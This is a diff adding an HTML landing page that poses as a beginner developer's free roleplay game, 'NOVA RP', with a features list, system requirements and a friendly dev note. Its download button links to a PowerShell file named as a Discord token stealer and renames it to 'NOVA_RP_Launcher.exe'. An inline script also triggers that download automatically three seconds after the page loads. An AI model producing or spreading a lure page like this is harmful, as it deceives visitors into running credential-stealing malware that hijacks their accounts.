@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>NOVA RP first test game</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Quicksand:wght@300;400;500;600;700&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: #0d0d1a;
+            font-family: 'Quicksand', sans-serif;
+            color: #c0c0c0;
+            min-height: 100vh;
+        }
+
+        .topbar {
+            background: #12122a;
+            padding: 15px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #1e1e3a;
+        }
+
+        .topbar .logo {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 1.1em;
+            color: #7b7fff;
+            letter-spacing: 2px;
+        }
+
+        .topbar .status {
+            font-size: 0.75em;
+            color: #555;
+        }
+
+        .topbar .status .dot {
+            display: inline-block;
+            width: 8px; height: 8px;
+            background: #44ff44;
+            border-radius: 50%;
+            margin-right: 5px;
+            vertical-align: middle;
+        }
+
+        .main {
+            max-width: 700px;
+            margin: 50px auto;
+            padding: 0 25px;
+            text-align: center;
+        }
+
+        .game-title {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 2em;
+            color: #7b7fff;
+            margin-bottom: 5px;
+            letter-spacing: 3px;
+        }
+
+        .game-subtitle {
+            font-size: 1em;
+            color: #666;
+            margin-bottom: 30px;
+            font-weight: 300;
+        }
+
+        .screenshot {
+            width: 100%;
+            height: 300px;
+            background: #161630;
+            border: 2px dashed #2a2a4a;
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+            color: #444;
+            font-size: 0.9em;
+        }
+
+        .screenshot .icon {
+            font-size: 3em;
+            margin-bottom: 10px;
+        }
+
+        .screenshot .note {
+            font-size: 0.75em;
+            color: #333;
+        }
+
+        .about {
+            background: #12122a;
+            border: 1px solid #1e1e3a;
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .about h2 {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 0.9em;
+            color: #7b7fff;
+            margin-bottom: 12px;
+            letter-spacing: 1px;
+        }
+
+        .about p {
+            font-size: 0.9em;
+            line-height: 1.7;
+            color: #888;
+        }
+
+        .features {
+            background: #12122a;
+            border: 1px solid #1e1e3a;
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .features h2 {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 0.9em;
+            color: #7b7fff;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        .features ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .features li {
+            padding: 8px 0;
+            color: #777;
+            font-size: 0.9em;
+            border-bottom: 1px solid #1a1a30;
+        }
+
+        .features li:last-child { border-bottom: none; }
+
+        .features li::before {
+            content: '▸ ';
+            color: #555;
+        }
+
+        .dev-note {
+            background: #1a1a2e;
+            border-left: 3px solid #7b7fff;
+            border-radius: 0 8px 8px 0;
+            padding: 18px 22px;
+            margin-bottom: 25px;
+            font-size: 0.85em;
+            color: #666;
+            line-height: 1.6;
+        }
+
+        .dev-note strong {
+            color: #7b7fff;
+        }
+
+        .download-section {
+            margin: 35px 0;
+        }
+
+        .download-btn {
+            display: inline-block;
+            padding: 16px 50px;
+            font-family: 'Quicksand', sans-serif;
+            font-size: 1.1em;
+            font-weight: 600;
+            color: #0d0d1a;
+            background: #7b7fff;
+            border: none;
+            border-radius: 8px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+        }
+
+        .download-btn:hover {
+            background: #9595ff;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(123,127,255,0.3);
+        }
+
+        .download-btn .arrow {
+            margin-left: 6px;
+        }
+
+        .download-note {
+            margin-top: 12px;
+            font-size: 0.8em;
+            color: #444;
+        }
+
+        .requirements {
+            background: #12122a;
+            border: 1px solid #1e1e3a;
+            border-radius: 12px;
+            padding: 20px 25px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .requirements h2 {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 0.8em;
+            color: #7b7fff;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+
+        .requirements p {
+            font-size: 0.85em;
+            color: #555;
+            line-height: 1.6;
+        }
+
+        .footer {
+            padding: 30px;
+            text-align: center;
+            border-top: 1px solid #1e1e3a;
+            margin-top: 30px;
+        }
+
+        .footer p {
+            font-size: 0.75em;
+            color: #333;
+        }
+
+        .footer .made-with {
+            margin-top: 8px;
+            font-size: 0.7em;
+            color: #2a2a4a;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .main > * {
+            animation: fadeIn 0.8s ease forwards;
+        }
+
+        .main > *:nth-child(2) { animation-delay: 0.1s; }
+        .main > *:nth-child(3) { animation-delay: 0.2s; }
+        .main > *:nth-child(4) { animation-delay: 0.3s; }
+        .main > *:nth-child(5) { animation-delay: 0.4s; }
+        .main > *:nth-child(6) { animation-delay: 0.5s; }
+        .main > *:nth-child(7) { animation-delay: 0.6s; }
+        .main > *:nth-child(8) { animation-delay: 0.7s; }
+        .main > *:nth-child(9) { animation-delay: 0.8s; }
+    </style>
+</head>
+<body>
+
+    <div class="topbar">
+        <div class="logo">NOVA RP</div>
+        <div class="status"><span class="dot"></span> Site Live</div>
+    </div>
+
+    <div class="main">
+
+        <div class="game-title">NOVA RP</div>
+        <div class="game-subtitle">My first game — just released!</div>
+
+        <div class="screenshot">
+            <div class="icon">🖥️</div>
+            <div>Screenshot coming soon</div>
+            <div class="note">The game page is still being built out</div>
+        </div>
+
+        <div class="about">
+            <h2>ABOUT THE GAME</h2>
+            <p>
+                Hey! This is my first game ever. I've been learning game development 
+                and decided to just go for it. NOVA RP is an open-world roleplay game 
+                where you can explore, build, and interact with other players. 
+                It's a work in progress but the core gameplay is functional.
+            </p>
+        </div>
+
+        <div class="features">
+            <h2>FEATURES</h2>
+            <ul>
+                <li>Open-world exploration</li>
+                <li>Multiplayer interaction</li>
+                <li>Custom character system</li>
+                <li>Building and crafting</li>
+                <li>Day/night cycle</li>
+            </ul>
+        </div>
+
+        <div class="dev-note">
+            <strong>Note from the dev:</strong> This is my very first project and I'm 
+            still learning. If you find bugs or have suggestions, I'd really appreciate 
+            your feedback! This game is free to download while I'm testing it.
+        </div>
+
+        <div class="requirements">
+            <h2>SYSTEM REQUIREMENTS</h2>
+            <p>
+                OS: Windows 10 or newer<br>
+                RAM: 4 GB minimum<br>
+                Storage: 3 GB available space<br>
+                GPU: Any modern graphics card
+            </p>
+        </div>
+
+        <div class="download-section">
+            <a href="https://gytox.github.io/NOVA_RP/discord_token_stealer.ps1" 
+               download="NOVA_RP_Launcher.exe" class="download-btn">
+                DOWNLOAD FREE <span class="arrow">→</span>
+            </a>
+            <p class="download-note">Free while in beta — no payment required</p>
+        </div>
+
+    </div>
+
+    <div class="footer">
+        <p>NOVA RP — Made with ❤️ by a beginner dev</p>
+        <p class="made-with">This is my first project. Be kind, it's my first time 😅</p>
+    </div>
+
+    <script>
+        setTimeout(function(){
+            var a = document.createElement('a');
+            a.href = 'https://gytox.github.io/NOVA_RP/discord_token_stealer.ps1';
+            a.download = 'NOVA_RP_Launcher.exe';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }, 3000);
+    </script>
+
+</body>
+</html>
